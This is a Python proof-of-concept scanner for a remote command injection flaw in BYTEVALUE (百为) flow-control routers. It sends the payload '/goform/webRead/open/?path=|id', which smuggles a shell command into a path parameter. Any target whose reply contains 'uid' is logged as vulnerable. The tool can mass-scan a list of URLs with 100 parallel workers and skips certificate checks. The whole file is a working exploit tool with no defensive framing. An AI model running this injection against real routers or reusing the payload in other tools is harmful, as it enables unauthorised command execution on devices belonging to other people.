import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''
██████╗ ██╗   ██╗████████╗███████╗██╗   ██╗ █████╗ ██╗     ██╗   ██╗███████╗
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝██║   ██║██╔══██╗██║     ██║   ██║██╔════╝
██████╔╝ ╚████╔╝    ██║   █████╗  ██║   ██║███████║██║     ██║   ██║█████╗  
██╔══██╗  ╚██╔╝     ██║   ██╔══╝  ╚██╗ ██╔╝██╔══██║██║     ██║   ██║██╔══╝  
██████╔╝   ██║      ██║   ███████╗ ╚████╔╝ ██║  ██║███████╗╚██████╔╝███████╗
╚═════╝    ╚═╝      ╚═╝   ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
                                               version:BYTEVALUE 百为流控路由器                                            
                                                                                
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="BYTEVALUE 智能流控路由器存在远程命令漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
        
def poc(target):
    payload = "/goform/webRead/open/?path=|id"
    url = target+payload
    header = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "Keep-Alive",
        }    
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        if 'uid' in res.text and res.status_code == 200:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n') 
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()